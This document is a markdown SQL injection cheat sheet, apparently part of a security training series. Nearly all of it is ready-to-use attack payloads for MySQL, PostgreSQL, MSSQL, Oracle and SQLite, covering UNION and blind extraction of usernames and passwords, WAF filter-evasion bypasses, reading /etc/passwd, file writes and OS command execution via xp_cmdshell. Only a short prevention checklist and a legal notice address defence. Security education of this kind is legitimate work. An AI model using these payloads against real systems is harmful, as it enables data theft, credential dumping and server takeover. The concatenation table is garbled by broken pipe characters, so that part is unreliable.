# 22 - SQL Injection Cheat Sheet

Quick reference for all SQL injection techniques.

## Detection Payloads

### Basic Tests

| Test          | Payload       | Expected (Vulnerable)    |
| ------------- | ------------- | ------------------------ |
| Quote         | `'`           | SQL error                |
| Double quote  | `"`           | SQL error                |
| Comment       | `--`          | No error (comment works) |
| Boolean True  | `' AND 1=1--` | Normal response          |
| Boolean False | `' AND 1=2--` | Different response       |

### Time-Based Detection

| Database   | Payload                          |
| ---------- | -------------------------------- |
| MySQL      | `' AND SLEEP(5)--`               |
| PostgreSQL | `'; SELECT pg_sleep(5)--`        |
| MSSQL      | `'; WAITFOR DELAY '0:0:5'--`     |
| Oracle     | `' AND DBMS_LOCK.SLEEP(5)--`     |
| SQLite     | `' AND randomblob(1000000000)--` |

## Database Fingerprinting

### Version Detection

| Database   | Query                     |
| ---------- | ------------------------- |
| MySQL      | `SELECT @@version`        |
| PostgreSQL | `SELECT version()`        |
| MSSQL      | `SELECT @@VERSION`        |
| Oracle     | `SELECT * FROM v$version` |
| SQLite     | `SELECT sqlite_version()` |

### Current database

| Database   | Query                                                |
| ---------- | ---------------------------------------------------- |
| MySQL      | `SELECT database()`                                  |
| PostgreSQL | `SELECT current_database()`                          |
| MSSQL      | `SELECT DB_NAME()`                                   |
| Oracle     | `SELECT SYS_CONTEXT('USERENV', 'DB_NAME') FROM DUAL` |
| SQLite     | N/A (single file)                                    |

### Current User

| Database   | Query                   |
| ---------- | ----------------------- |
| MySQL      | `SELECT user()`         |
| PostgreSQL | `SELECT current_user`   |
| MSSQL      | `SELECT SYSTEM_USER`    |
| Oracle     | `SELECT user FROM DUAL` |
| SQLite     | N/A                     |

## Schema Enumeration

### List Tables

| Database   | Query                                                                            |
| ---------- | -------------------------------------------------------------------------------- |
| MySQL      | `SELECT table_name FROM information_schema.tables WHERE table_schema=database()` |
| PostgreSQL | `SELECT tablename FROM pg_tables WHERE schemaname='public'`                      |
| MSSQL      | `SELECT name FROM sys.tables`                                                    |
| Oracle     | `SELECT table_name FROM user_tables`                                             |
| SQLite     | `SELECT name FROM sqlite_master WHERE type='table'`                              |

### List Columns

| Database   | Query                                                                         |
| ---------- | ----------------------------------------------------------------------------- |
| MySQL      | `SELECT column_name FROM information_schema.columns WHERE table_name='users'` |
| PostgreSQL | `SELECT column_name FROM information_schema.columns WHERE table_name='users'` |
| MSSQL      | `SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('users')`             |
| Oracle     | `SELECT column_name FROM user_tab_columns WHERE table_name='USERS'`           |
| SQLite     | `PRAGMA table_info(users)`                                                    |

## Union Injection

### Column Count

```sql
ORDER BY 1--
ORDER BY 2--
ORDER BY 3--
... until error

UNION SELECT NULL--
UNION SELECT NULL,NULL--
UNION SELECT NULL,NULL,NULL--
... until works
```

### Data Extraction

```sql
-- Version
UNION SELECT 1,@@version,3--

-- Tables
UNION SELECT 1,table_name,3 FROM information_schema.tables--

-- Columns
UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--

-- Data
UNION SELECT 1,username,password FROM users--
```

### Concatenation

| Database   | Syntax                                                |
| ---------- | ----------------------------------------------------- | --- | --- | --- | ------------------------------ |
| MySQL      | `CONCAT(col1,':',col2)` or `CONCAT_WS(':',col1,col2)` |
| PostgreSQL | `col1                                                 |     | ':' |     | col2`or`CONCAT(col1,':',col2)` |
| MSSQL      | `col1+':'+col2` or `CONCAT(col1,':',col2)`            |
| Oracle     | `col1                                                 |     | ':' |     | col2`                          |
| SQLite     | `col1                                                 |     | ':' |     | col2`                          |

## Blind Injection

### Boolean-Based

```sql
-- Check character
' AND SUBSTRING((SELECT @@version),1,1)='5'--

-- Check ASCII
' AND ASCII(SUBSTRING((SELECT @@version),1,1))=53--

-- Binary search
' AND ASCII(SUBSTRING((SELECT @@version),1,1))>80--
```

### Time-Based

| Database   | Payload                                                                                                         |
| ---------- | --------------------------------------------------------------------------------------------------------------- |
| MySQL      | `' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))=97, SLEEP(5), 0)--`                        |
| PostgreSQL | `' AND CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))=97) THEN pg_sleep(5) ELSE 0 END--` |
| MSSQL      | `'; IF (ASCII(SUBSTRING((SELECT password FROM users),1,1))=97) WAITFOR DELAY '0:0:5'--`                         |
| Oracle     | `' AND CASE WHEN (ASCII(SUBSTR((SELECT password FROM users),1,1))=97) THEN DBMS_LOCK.SLEEP(5) ELSE 0 END--`     |

## Filter Evasion

### Common Bypasses

| Blocked  | Bypass                                     |
| -------- | ------------------------------------------ |
| `UNION`  | `UnIoN`, `UN/**/ION`, `/*!50000UNION*/`    |
| `SELECT` | `SeLeCt`, `SEL/**/ECT`, `/*!50000SELECT*/` |
| Space    | `/**/`, `%0b`, `%0a`, `%0c`, `%0d`         |
| `OR`     | `\|\|`, `O/**/R`                           |
| `AND`    | `&&`, `A/**/ND`                            |
| `=`      | `LIKE`, `IN`, `BETWEEN`                    |

### Encoding

```
Single quote: %27 or %2527 (double)
Space: %20 or +
--: %2D%2D
```

## File Operations

### Read Files

| Database   | Query                                                       |
| ---------- | ----------------------------------------------------------- |
| MySQL      | `SELECT LOAD_FILE('/etc/passwd')`                           |
| PostgreSQL | `SELECT pg_read_file('postgresql.conf',0,1000)`             |
| MSSQL      | `SELECT * FROM OPENROWSET(BULK 'C:\file.txt', SINGLE_CLOB)` |
| Oracle     | `SELECT UTL_FILE.FGET_LINE(...) FROM DUAL`                  |

### Write Files

| Database   | Query                                        |
| ---------- | -------------------------------------------- |
| MySQL      | `SELECT 'content' INTO OUTFILE '/path/file'` |
| PostgreSQL | `COPY (SELECT 'content') TO '/path/file'`    |
| MSSQL      | Ole Automation or xp_cmdshell                |
| Oracle     | UTL_FILE or external tables                  |

## OS Command Execution

### Direct Execution

| Database   | Method         | Query                              |
| ---------- | -------------- | ---------------------------------- |
| MySQL      | UDF            | `SELECT sys_exec('id')`            |
| PostgreSQL | COPY           | `COPY (SELECT '') TO PROGRAM 'id'` |
| MSSQL      | xp_cmdshell    | `EXEC xp_cmdshell 'whoami'`        |
| Oracle     | Java/Scheduler | Complex (see full guide)           |

### Enable xp_cmdshell (MSSQL)

```sql
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE
```

## Useful Functions by Database

### MySQL

```sql
-- String functions
SUBSTRING(), SUBSTR(), MID()
CONCAT(), CONCAT_WS(), GROUP_CONCAT()
LENGTH(), CHAR_LENGTH()

-- Information
@@version, @@datadir, @@hostname
database(), USER(), CURRENT_USER()

-- File
LOAD_FILE(), INTO OUTFILE/DUMPFILE

-- Time
SLEEP(), BENCHMARK(), NOW()

-- Encoding
HEX(), UNHEX(), TO_BASE64(), FROM_BASE64()
```

### PostgreSQL

```sql
-- String functions
SUBSTRING(), SUBSTR()
|| (concat), CONCAT(), CONCAT_WS()
LENGTH(), CHAR_LENGTH()

-- Information
version(), current_database(), current_user

-- Time
pg_sleep(), now(), current_timestamp

-- Encoding
decode(), encode()
```

### MSSQL

```sql
-- String functions
SUBSTRING(), LEFT(), RIGHT()
+ (concat), CONCAT()
LEN(), DATALENGTH()

-- Information
@@VERSION, @@SERVERNAME, DB_NAME()
SYSTEM_USER, USER_NAME(), SUSER_SNAME()

-- Time
WAITFOR DELAY, GETDATE()

-- System
xp_cmdshell, sp_OACreate, OPENROWSET
```

### Oracle

```sql
-- String functions
SUBSTR(), LENGTH(), INSTR()
|| (concat), CONCAT()

-- Information
v$version, user, SYS_CONTEXT()

-- Time
DBMS_LOCK.SLEEP(), SYSDATE

-- File
UTL_FILE, DBMS_XSLPROCESSOR
```

## Common Table Names

```
users, user_accounts, user_profiles
admin, administrators, admins
customers, clients, members
orders, transactions, payments
products, items, inventory
categories, tags
sessions, tokens, cookies
logs, audit_logs, activity
emails, messages, notifications
config, settings, preferences
passwords, credentials, secrets
credit_cards, billing, invoices
```

## Common Column Names

```
Authentication:
  username, user_name, login, email, password, pass, pwd, passwd
  hash, password_hash, salt, token, api_key, secret

Personal:
  first_name, last_name, full_name, name, phone, address
  city, country, zip, postal_code

System:
  id, user_id, created_at, updated_at, deleted_at
  status, active, is_admin, role, permissions

Financial:
  credit_card, card_number, cvv, expiry, amount, balance
```

## Error Signatures

| Error Text             | Database   |
| ---------------------- | ---------- |
| `MySQL` / `MariaDB`    | MySQL      |
| `PostgreSQL` / `PG::`  | PostgreSQL |
| `Microsoft SQL Server` | MSSQL      |
| `ORA-` / `Oracle`      | Oracle     |
| `SQLite`               | SQLite     |
| `syntax error`         | Generic    |

## Prevention Checklist

- [ ] Use parameterized queries / prepared statements
- [ ] Input validation (whitelist approach)
- [ ] Least privilege database user
- [ ] Disable dangerous features (xp_cmdshell, FILE)
- [ ] Web Application Firewall (WAF)
- [ ] Regular security testing
- [ ] Error handling (no verbose SQL errors in production)

## Legal Notice

This cheat sheet is for **authorized security testing and educational purposes only**. Always obtain proper written permission before testing any system.

**Full Guides**: See individual files 01-11 for detailed explanations and practice exercises.
